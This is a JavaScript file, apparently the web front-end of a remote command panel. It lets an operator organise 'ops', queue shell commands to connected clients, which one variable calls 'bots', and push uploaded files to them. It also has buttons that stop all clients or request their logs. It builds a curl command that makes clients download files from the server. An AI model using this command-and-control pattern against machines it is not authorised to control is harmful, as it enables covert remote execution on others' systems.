var current_op = null;
var on_command_page = false;

{{#api_url}}
var api_url = `{{{api_url}}}`;
{{/api_url}}
{{^api_url}}
var api_url = `${window.location.protocol}//${window.location.hostname}:8080`;
{{/api_url}}


function fetch_all_ops() {
    // Fetch all known ops and put them in the select option list.
    var select_tag = document.getElementById('ops-select');
    select_tag.innerHTML = `<option value='Choose an op'>Choose an op</option>`;
    var req = new XMLHttpRequest();
    req.responseType = 'json';
    
    req.addEventListener('load', function () {
        var all_ops = this.response['data']['ops'];
        for (var i=0; i < all_ops.length; i++) {
            var new_option = document.createElement('option');
            new_option.text = all_ops[i];
            select_tag.add(new_option);
        }
    });
    req.open('GET', `${api_url}/op`);
    req.send();
}

function change_op(op_name) {
    current_op = op_name;
    console.log(`Loading new op: ${current_op}.`);
    display_commands();
    display_delete_op_button();
}

function detect_op_choice() {
    var select_tag = document.getElementById('ops-select');
    select_tag.addEventListener('change', function () {
        var op_choice = select_tag.value;
        console.log(op_choice);
        if (op_choice != 'Choose an op') {
            change_op(op_choice);
        } else {
            current_op = null;
            hide_all_content();
            document.getElementById('delete-nav').style.display = 'none';
        }
    });
}

function detect_new_op_click() {
    var new_tag = document.getElementById('new-nav');
    new_tag.addEventListener('click', function () {
        var new_op_name = prompt('Create a new op', '');
        if (new_op_name == null || new_op_name == '') {
            return;
        }
        
        var json_data = JSON.stringify({'op_name': new_op_name});

        var req = new XMLHttpRequest();
        req.responseType = 'json';
        
        req.addEventListener('load', function () {
            console.log(this.response);
            fetch_all_ops();
        });
        req.open('POST',`${api_url}/op/create`);
        req.send(json_data);
    });
}

function submit_current_command() {
    var command = document.getElementById('command-input').value;
    var confirmation = confirm(`Command to execute: ${command}`);
    if (!confirmation) {
        return;
    }
    var command_type = document.getElementById('command-type-choice').value;
    var req = new XMLHttpRequest();
    req.responseType = 'json';

    var json_data = JSON.stringify(
    {
        'cmd_type': command_type,
        'cmd_data': command,
        'op_name': current_op,

    });

    req.addEventListener('load', function () {
        document.getElementById('command-input').value = '';
        load_all_commands();
    });
    req.open('POST', `${api_url}/post`);
    req.send(json_data);
}

function detect_create_command_click() {
    document.getElementById('command-create').addEventListener('click', submit_current_command);
}

function get_row_class(row_pos, list_len) {
    var row_class = '';
    if (list_len % 2 == 0) {
        if (row_pos % 2 == 0) {
            row_class = 'even-row';
        } else {
            row_class = 'odd-row';
        }
    } else {
        if (row_pos % 2 == 0) {
            row_class = 'odd-row';
        } else {
            row_class = 'even-row';
        }
    }
    return row_class;
}

function load_all_commands() {
    on_command_page = true;
    if (!current_op) {
        return;
    }
    var req = new XMLHttpRequest();
    req.responseType = 'json';

    // Clear previous contents
    req.addEventListener('load', function () {
        var all_commands = this.response['data']['commands'];
        var command_table = document.getElementById('command-table-body');
        command_table.innerHTML = `<tr class='command-table-header' class='command-table-header'>
    <th width='20%'>Time</th>
    <th width='10%'>Type</th>
    <th width='70%'>Command</th>
</tr>
`
        for (var i = 0; i < all_commands.length; i++) {
            var row_class = get_row_class(i, all_commands.length);
            var cmd = all_commands[i];
            var new_cmd_row = document.createElement('tr');
            new_cmd_row.className = row_class;

            var new_cmd_time = document.createElement('td');
            new_cmd_time.innerText = cmd['created'];

            var new_cmd_type = document.createElement('td');
            new_cmd_type.innerText = cmd['type'];

            var new_cmd_data = document.createElement('td');
            new_cmd_data.innerText = cmd['cmd'];

            new_cmd_row.appendChild(new_cmd_time);
            new_cmd_row.appendChild(new_cmd_type);
            new_cmd_row.appendChild(new_cmd_data);

            command_table.appendChild(new_cmd_row);
        }
    });
    req.open('GET', `${api_url}/op/${current_op}/commands`);
    req.send();
}

function display_commands() {
    if (!current_op) {
        return;
    }
    console.log(`Displaying commands for op ${current_op}`);

    display_specific_content('command-content');
    load_all_commands();
}

function display_files() {
    if (!current_op) {
        return;
    }
    console.log(`Displaying files for op ${current_op}`);
    display_specific_content('files-content');

    var files_content_div = document.getElementById('files-list');
    files_content_div.innerHTML = '';
    var req = new XMLHttpRequest();
    req.responseType = 'json';
    
    req.addEventListener('load', function () {
        var all_files = this.response['data']['files'];
        for (var i=0; i < all_files.length; i++) {
            if (all_files[i]['op_name'] == current_op) {
                var file_container = document.createElement('div');
                file_container.className = 'file-container';
                var file_name = document.createElement('a');
                file_name.innerText = all_files[i]['filename'];
                file_name.className = 'file-name';
                file_name.href = `${api_url}/files/download/${all_files[i]['guid']}`;
                file_name.setAttribute('download', all_files[i]['filename']);

                var file_delete_link = document.createElement('div');
                file_delete_link.className = 'file-delete-button';
                file_delete_link.setAttribute('guid', all_files[i]['guid']);
                file_delete_link.innerText = 'Delete';
                file_delete_link.addEventListener('click', send_file_delete_request);

                var send_to_bots_link = document.createElement('div');
                send_to_bots_link.className = 'file-send-button';
                send_to_bots_link.setAttribute('guid', all_files[i]['guid']);
                send_to_bots_link.setAttribute('filename', all_files[i]['filename']);
                send_to_bots_link.innerText = 'Send to clients';
                send_to_bots_link.addEventListener('click', send_to_clients_request);

                file_container.appendChild(file_name);
                file_container.appendChild(send_to_bots_link);
                file_container.appendChild(file_delete_link);
                files_content_div.appendChild(file_container);
            }
        }
    });
    req.open('GET', `${api_url}/files`);
    req.send();
}

function send_to_clients_request() {
    // Information needed to downloading/saving file
    var guid_to_send = this.getAttribute('guid');
    var filename = this.getAttribute('filename');

    var req = new XMLHttpRequest();
    req.responseType = 'json';
    
    req.addEventListener('load', function () {
        console.log('Command sent.');
    });
    req.open('POST', `${api_url}/post`);

    var data = {
        'cmd_type': 'shell',
        'cmd_data': `curl ${api_url}/files/download/${guid_to_send} > "/app/downloads/${filename}"`,
        'op_name': current_op,
    }
    req.send(JSON.stringify(data));
}

function send_file_delete_request() {
    var decision = confirm('Are you sure you want to delete this?');
    if (!decision) {
        return;
    }
    var guid_to_delete = this.getAttribute('guid');
    var req = new XMLHttpRequest();
    req.responseType = 'json';
    
    req.addEventListener('load', function () {
        console.log('File deleted.');
        display_files();
    });
    req.open('POST', `${api_url}/files/delete`);

    var data = {
        'file': guid_to_delete,
    }
    req.send(JSON.stringify(data));
}

function hide_all_content() {
    return new Promise((resolve, reject) => {
        document.getElementById('command-content').className = 'none-display';
        document.getElementById('files-content').className = 'none-display';
        resolve();
    });
}

function display_specific_content(content) {
    on_command_page = false;
    hide_all_content()
    .then(() => {
        document.getElementById(content).className = content;
    })
    .catch((err) => {
        console.log(err);
    });
}

function bind_command_nav() {
    document.getElementById('commands-nav').addEventListener('click', display_commands);
}

function bind_files_nav() {
    document.getElementById('files-nav').addEventListener('click', display_files);
}

function bind_upload_button() {
    var upload_button = document.getElementById('file-upload-button');
    upload_button.addEventListener('click', function() {
        var file_input = document.getElementById('file-upload');
        if (!file_input.files[0]) {
            return;
        }
        var form_data = new FormData();
        form_data.append('file', file_input.files[0]);
        form_data.append('op_name', current_op);
        
        
        var req = new XMLHttpRequest();
        req.responseType = 'json';
        
        req.addEventListener('load', function () {
            console.log('File uploaded.');
            display_files();
            file_input.value = null;
        });
        req.open('POST', `${api_url}/files/upload`);
        req.send(form_data);
    });
}

function delete_current_op() {
    if (!current_op) {
        return;
    }
    var confirmation = confirm(`Delete ${current_op} op?`);
    if (!confirmation) {
        return;
    }

    var req = new XMLHttpRequest();
    req.responseType = 'json';

    var data = {
        'op_name': current_op,
    }
    
    req.addEventListener('load', function () {
        console.log('Updating op list.');
        current_op = null;
        var delete_op_button = document.getElementById('delete-nav');
        delete_op_button.style.display = 'none';
        hide_all_content();
        fetch_all_ops();
        var select_tag = document.getElementById('ops-select');
        select_tag.value = null;
    });
    req.open('POST', `${api_url}/op/delete`);
    req.send(JSON.stringify(data));
}

function bind_delete_op_button() {
    var delete_op_button = document.getElementById('delete-nav');
    delete_op_button.addEventListener('click', delete_current_op);

    // Hide the delete button when we don't have a select op
    if (!current_op) {
        delete_op_button.style.display = 'none';
    }
}

function display_delete_op_button() {
    var delete_op_button = document.getElementById('delete-nav');
    delete_op_button.style.display = 'initial';
}

function override_enter_key() {
    var command_input_box = document.getElementById('command-input');
    command_input_box.addEventListener('keypress', function (e) {
        var enter_key_code = 13;
        if (e.keyCode == enter_key_code) {
            submit_current_command();
        }
    });
}

function submit_control_command(command) {
    var command_type = 'control';
    var req = new XMLHttpRequest();
    req.responseType = 'json';

    var json_data = JSON.stringify(
    {
        'cmd_type': command_type,
        'cmd_data': command,
        'op_name': current_op,
    });

    req.addEventListener('load', function () {
        document.getElementById('command-input').value = '';
        load_all_commands();
    });
    req.open('POST', `${api_url}/post`);
    req.send(json_data);
}

function submit_halt_command() {
    var confirmation = confirm(`Are you sure you want to stop all connected clients?`);
    if (!confirmation) {
        return;
    }
    submit_control_command('stop');
}

function submit_log_request_command() {
    submit_control_command('logs');
}

function bind_convenience_buttons() {
    var halt_button = document.getElementById('halt-button');
    halt_button.addEventListener('click', submit_halt_command);

    var log_button = document.getElementById('log-button');
    log_button.addEventListener('click', submit_log_request_command);
}

function init() {
    fetch_all_ops();
    detect_op_choice();
    detect_new_op_click();
    detect_create_command_click();
    hide_all_content();
    bind_command_nav();
    bind_files_nav();
    bind_upload_button();
    bind_delete_op_button();
    bind_convenience_buttons();
    override_enter_key();
}

window.onload = init;
